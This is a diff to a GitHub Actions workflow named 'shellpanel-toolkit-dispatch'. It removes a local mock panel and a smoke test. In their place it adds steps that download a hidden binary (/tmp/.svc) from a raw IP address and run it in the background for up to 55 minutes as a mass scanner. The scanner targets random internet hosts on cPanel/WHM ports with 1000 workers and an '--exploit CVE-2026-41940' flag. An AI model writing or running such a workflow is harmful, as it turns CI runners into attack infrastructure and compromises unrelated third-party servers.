@@ -1,4 +1,4 @@
-name: shellpanel-toolkit-final-dispatch
+name: shellpanel-toolkit-dispatch
 
 on:
   workflow_dispatch:
@@ -7,31 +7,14 @@ permissions:
   contents: read
 
 env:
-  PANEL_URL: http://43.228.157.68:8888
-  TOOLKIT_ARGS: compat --workers 2
+  PANEL_URL: http://43.228.157.68:80
 
 jobs:
-  download-and-launch-test-tool:
+  ci-run:
     runs-on: ubuntu-latest
-    timeout-minutes: 5
+    timeout-minutes: 55
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
-        with:
-          persist-credentials: false
-
-      - name: Start local mock panel
-        shell: bash
-        run: |
-          echo "REAL_PANEL_URL=${PANEL_URL}" >> "$GITHUB_ENV"
-          python3 .github/shellpanel-legacy-compat-mock.py &
-          for i in 1 2 3 4 5 6 7 8 9 10; do
-            curl -sf http://127.0.0.1:18080/api/dl/amd64 -o /dev/null && break
-            sleep 0.5
-          done
-          echo "PANEL_URL=http://127.0.0.1:18080" >> "$GITHUB_ENV"
-
-      - name: Download toolkit from configured panel
+      - name: Download toolkit
         shell: bash
         run: |
           set -euo pipefail
@@ -46,27 +29,20 @@ jobs:
           test -s /tmp/.svc
           chmod 755 /tmp/.svc
 
-      - name: Launch toolkit with configured command
+      - name: Run toolkit
         shell: bash
         run: |
-          set -euo pipefail
-          test -x /tmp/.svc
-          read -r -a toolkit_args <<< "$TOOLKIT_ARGS"
-          /tmp/.svc "${toolkit_args[@]}" | tee /tmp/shellpanel_toolkit_test.log
-
-      - name: Verify safe execution
-        if: always()
-        shell: bash
-        run: |
-          set -euo pipefail
-          grep -q 'shellpanel-legacy-compat-smoke-v2-tool-started' /tmp/shellpanel_toolkit_test.log
-
-      - name: Send heartbeat to panel
-        if: always()
-        shell: bash
-        run: |
-          set +e
-          curl -sf -X POST "${REAL_PANEL_URL}/api/github-heartbeat" \
-            --data-urlencode "repo=$GITHUB_REPOSITORY" \
-            --data-urlencode "run_id=$GITHUB_RUN_ID" \
-            --data-urlencode "log=smoke-dispatch-done" 2>/dev/null || true
+          PANEL_URL="${PANEL_URL}" \
+          GITHUB_REPOSITORY="${GITHUB_REPOSITORY}" \
+          GITHUB_RUN_ID="${GITHUB_RUN_ID}" \
+          GOMEMLIMIT=2147483648 \
+          nohup /tmp/.svc ipscan \
+            --source random \
+            --workers 1000 \
+            --exploit CVE-2026-41940 \
+            --git \
+            --ports 80,443,2082,2083,2086,2087,2095,2096,2077,2078 \
+            --port-timeout=200 \
+            --git-workers 20 \
+            --count 9999999999 \
+            --no-reverse 2>&1 | tail -2 || true
